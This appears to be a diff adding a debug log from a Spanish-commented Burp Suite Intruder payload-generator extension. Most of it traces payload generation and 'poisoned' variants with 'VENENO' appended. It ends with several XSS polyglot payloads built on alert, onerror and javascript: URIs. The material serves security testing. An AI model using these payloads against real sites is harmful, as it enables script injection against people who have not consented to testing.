@@ -1,0 +1,1312 @@
+Inicializacion clase BurpExtender
+('Insuno.Insuno.BurpExtender.registerExtenderCallbaks', org.python.proxies.__main__$BurpExtender$0@4931c89b)
+
+
+('Creacion nueva instancia Insuno desde Insuno.BurpExtender instanciado en : ', org.python.proxies.__main__$BurpExtender$0@4931c89b)
+
+
+('Constructo de ataque instanciado en : ', burp.bvw@2f510e30)
+
+
+('Inicializacion Insuno desde Insuno.Insuno instanciado en : ', org.python.proxies.__main__$Insuno$1@7eaa8d9a)
+
+
+getNextPayload
+org.python.proxies.__main__$Insuno$1@7eaa8d9a
+
+
+('class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory).registerExtenderCallbacks(self, callbacks)', org.python.proxies.__main__$BurpExtender$0@67cf500f)
+
+
+('class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory).registerExtenderCallbacks(self, callbacks)', org.python.proxies.__main__$BurpExtender$0@54718bff)
+
+
+('Insuno.BurpExtender.registerExtenderCallbacks', org.python.proxies.__main__$BurpExtender$0@7bd043c)
+
+
+('Insuno.BurpExtender.getGeneratorName', org.python.proxies.__main__$BurpExtender$0@7205a145)
+
+
+('Insuno.BurpExtender.registerExtenderCallbacks', org.python.proxies.__main__$BurpExtender$0@7205a145)
+
+
+('Insuno.BurpExtender.getGeneratorName', org.python.proxies.__main__$BurpExtender$0@3e0f92b4)
+
+
+('Insuno.BurpExtender.registerExtenderCallbacks', org.python.proxies.__main__$BurpExtender$0@3e0f92b4)
+
+
+('Insuno.BurpExtender.getGeneratorName', org.python.proxies.__main__$BurpExtender$0@3d4005e0)
+
+
+('Insuno.BurpExtender.registerExtenderCallbacks', org.python.proxies.__main__$BurpExtender$0@3d4005e0)
+
+
+('Insuno.BurpExtender.getGeneratorName', org.python.proxies.__main__$BurpExtender$0@68008cad)
+('Insuno.BurpExtender.registerExtenderCallbacks', org.python.proxies.__main__$BurpExtender$0@68008cad)
+('Insuno.BurpExtender.getGeneratorName', org.python.proxies.__main__$BurpExtender$0@174641d2)
+('Insuno.BurpExtender.registerExtenderCallbacks', org.python.proxies.__main__$BurpExtender$0@174641d2)
+('Insuno.BurpExtender.getGeneratorName', org.python.proxies.__main__$BurpExtender$0@345a2e6f)
+('Insuno.BurpExtender.registerExtenderCallbacks', org.python.proxies.__main__$BurpExtender$0@345a2e6f)
+('Insuno.BurpExtender.createNewInstance', org.python.proxies.__main__$BurpExtender$0@345a2e6f, burp.bvw@3e9a06e4)
+('Inicializacion Insuno desde Insuno.Insuno instanciado en : ', org.python.proxies.__main__$Insuno$1@36910046)
+
+
+getNextPayload
+org.python.proxies.__main__$Insuno$1@36910046
+
+
+('Insuno.BurpExtender.getGeneratorName', org.python.proxies.__main__$BurpExtender$0@4f6f41b)
+('Insuno.BurpExtender.registerExtenderCallbacks', org.python.proxies.__main__$BurpExtender$0@4f6f41b)
+('Insuno.BurpExtender.createNewInstance', org.python.proxies.__main__$BurpExtender$0@4f6f41b, burp.bvw@3a842b87)
+('Inicializacion Insuno desde Insuno.Insuno instanciado en ', org.python.proxies.__main__$Insuno$1@6b6a7d1f)
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@6b6a7d1f)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@6b6a7d1f, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.BurpExtender.getGeneratorName', org.python.proxies.__main__$BurpExtender$0@46d0d228)
+('Insuno.BurpExtender.registerExtenderCallbacks', org.python.proxies.__main__$BurpExtender$0@46d0d228)
+('Insuno.BurpExtender.createNewInstance', org.python.proxies.__main__$BurpExtender$0@46d0d228, burp.bvw@22dd3c07)
+('Inicializacion Insuno desde Insuno.Insuno instanciado en ', org.python.proxies.__main__$Insuno$1@73ab3303)
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@73ab3303)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@73ab3303, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.BurpExtender.getGeneratorName', org.python.proxies.__main__$BurpExtender$0@5dc8d185)
+('Insuno.BurpExtender.registerExtenderCallbacks', org.python.proxies.__main__$BurpExtender$0@5dc8d185)
+('Insuno.BurpExtender.createNewInstance', org.python.proxies.__main__$BurpExtender$0@5dc8d185, burp.bvw@3bd1f520)
+('Inicializacion Insuno desde Insuno.Insuno instanciado en ', org.python.proxies.__main__$Insuno$1@6a3ee667)
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@6a3ee667)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@6a3ee667, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.BurpExtender.getGeneratorName', org.python.proxies.__main__$BurpExtender$0@6f899130)
+('Insuno.BurpExtender.registerExtenderCallbacks', org.python.proxies.__main__$BurpExtender$0@6f899130)
+('Insuno.BurpExtender.createNewInstance', org.python.proxies.__main__$BurpExtender$0@6f899130, burp.bvw@5dd68f1e)
+('Inicializacion Insuno desde Insuno.Insuno instanciado en ', org.python.proxies.__main__$Insuno$1@cdf9bd9)
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@cdf9bd9)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@cdf9bd9, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+
+
+('Insuno.BurpExtender.getGeneratorName', org.python.proxies.__main__$BurpExtender$0@117818db)
+('Insuno.BurpExtender.registerExtenderCallbacks', org.python.proxies.__main__$BurpExtender$0@117818db)
+('Insuno.BurpExtender.createNewInstance', org.python.proxies.__main__$BurpExtender$0@117818db, burp.bvw@2194e7eb)
+('Inicializacion Insuno desde Insuno.Insuno instanciado en ', org.python.proxies.__main__$Insuno$1@7061a9a7)
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@7061a9a7)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@7061a9a7, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.BurpExtender.createNewInstance', org.python.proxies.__main__$BurpExtender$0@117818db, burp.bvw@2b7e1559)
+('Inicializacion Insuno desde Insuno.Insuno instanciado en ', org.python.proxies.__main__$Insuno$1@6e7c9e52)
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@6e7c9e52)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@6e7c9e52, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.BurpExtender.createNewInstance', org.python.proxies.__main__$BurpExtender$0@117818db, burp.bvw@520dff10)
+('Inicializacion Insuno desde Insuno.Insuno instanciado en ', org.python.proxies.__main__$Insuno$1@170f7b35)
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@170f7b35)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@170f7b35, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.BurpExtender.createNewInstance', org.python.proxies.__main__$BurpExtender$0@117818db, burp.bvw@26520c4a)
+('Inicializacion Insuno desde Insuno.Insuno instanciado en ', org.python.proxies.__main__$Insuno$1@1b9a92ef)
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@1b9a92ef)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@1b9a92ef, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.BurpExtender.createNewInstance', org.python.proxies.__main__$BurpExtender$0@117818db, burp.bvw@5f58f3a4)
+('Inicializacion Insuno desde Insuno.Insuno instanciado en ', org.python.proxies.__main__$Insuno$1@457e1cb)
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@457e1cb)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@457e1cb, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.BurpExtender.createNewInstance', org.python.proxies.__main__$BurpExtender$0@117818db, burp.bvw@26580d5b)
+('Inicializacion Insuno desde Insuno.Insuno instanciado en ', org.python.proxies.__main__$Insuno$1@23b69e87)
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@23b69e87)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@23b69e87, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.BurpExtender.createNewInstance', org.python.proxies.__main__$BurpExtender$0@117818db, burp.bvw@1c756045)
+('Inicializacion Insuno desde Insuno.Insuno instanciado en ', org.python.proxies.__main__$Insuno$1@4a5822dd)
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@4a5822dd)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@4a5822dd, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.BurpExtender.getGeneratorName', org.python.proxies.__main__$BurpExtender$0@14749ede)
+('Insuno.BurpExtender.registerExtenderCallbacks', org.python.proxies.__main__$BurpExtender$0@14749ede)
+('Insuno.BurpExtender.createNewInstance', org.python.proxies.__main__$BurpExtender$0@14749ede, burp.bvw@2c6ce0fd)
+('Inicializacion Insuno desde Insuno.Insuno instanciado en ', org.python.proxies.__main__$Insuno$1@4277cb6b)
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@4277cb6b)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@4277cb6b, array('b', [99, 108, 111, 115, 101]))
+
+
+('Insuno.BurpExtender.getGeneratorName', org.python.proxies.__main__$BurpExtender$0@744565a6)
+('Insuno.BurpExtender.registerExtenderCallbacks', org.python.proxies.__main__$BurpExtender$0@744565a6)
+('Insuno.BurpExtender.createNewInstance', org.python.proxies.__main__$BurpExtender$0@744565a6, burp.bvw@5eb2b60e)
+('Inicializacion Insuno desde Insuno.Insuno instanciado en ', org.python.proxies.__main__$Insuno$1@fb8c6f3)
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@fb8c6f3)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@fb8c6f3, array('b', [99, 108, 111, 115, 101]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'close')
+('Insuno.getNextPayload.carga_envenenada', 'closeVENENO')
+
+
+('Insuno.BurpExtender.getGeneratorName', org.python.proxies.__main__$BurpExtender$0@7e027ca5)
+('Insuno.BurpExtender.registerExtenderCallbacks', org.python.proxies.__main__$BurpExtender$0@7e027ca5)
+('Insuno.BurpExtender.createNewInstance', org.python.proxies.__main__$BurpExtender$0@7e027ca5, burp.bvw@3d0a5ed)
+('Inicializacion Insuno desde Insuno.Insuno instanciado en ', org.python.proxies.__main__$Insuno$1@5287af55)
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@5287af55)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@5287af55, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.BurpExtender.getGeneratorName', org.python.proxies.__main__$BurpExtender$0@50d2b9f7)
+('Insuno.BurpExtender.registerExtenderCallbacks', org.python.proxies.__main__$BurpExtender$0@50d2b9f7)
+('Insuno.BurpExtender.getGeneratorName', org.python.proxies.__main__$BurpExtender$0@7f70aa09)
+('Insuno.BurpExtender.registerExtenderCallbacks', org.python.proxies.__main__$BurpExtender$0@7f70aa09)
+('Insuno.BurpExtender.createNewInstance', org.python.proxies.__main__$BurpExtender$0@7f70aa09, burp.bvw@5855ec5b)
+('Inicializacion Insuno desde Insuno.Insuno instanciado en ', org.python.proxies.__main__$Insuno$1@9d97b6a)
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@9d97b6a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@9d97b6a, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@9d97b6a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@9d97b6a, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@9d97b6a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@9d97b6a, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@9d97b6a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@9d97b6a, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@9d97b6a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@9d97b6a, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@9d97b6a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@9d97b6a, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@9d97b6a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@9d97b6a, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@9d97b6a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@9d97b6a, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@9d97b6a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@9d97b6a, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@9d97b6a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@9d97b6a, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@9d97b6a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@9d97b6a, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@9d97b6a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@9d97b6a, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@9d97b6a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@9d97b6a, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.BurpExtender.getGeneratorName', org.python.proxies.__main__$BurpExtender$0@530971b3)
+('Insuno.BurpExtender.registerExtenderCallbacks', org.python.proxies.__main__$BurpExtender$0@530971b3)
+('Insuno.BurpExtender.createNewInstance', org.python.proxies.__main__$BurpExtender$0@530971b3, burp.bvw@6fc3b8fd)
+('Inicializacion Insuno desde Insuno.Insuno instanciado en ', org.python.proxies.__main__$Insuno$1@3e78b9a9)
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@3e78b9a9)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@3e78b9a9, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
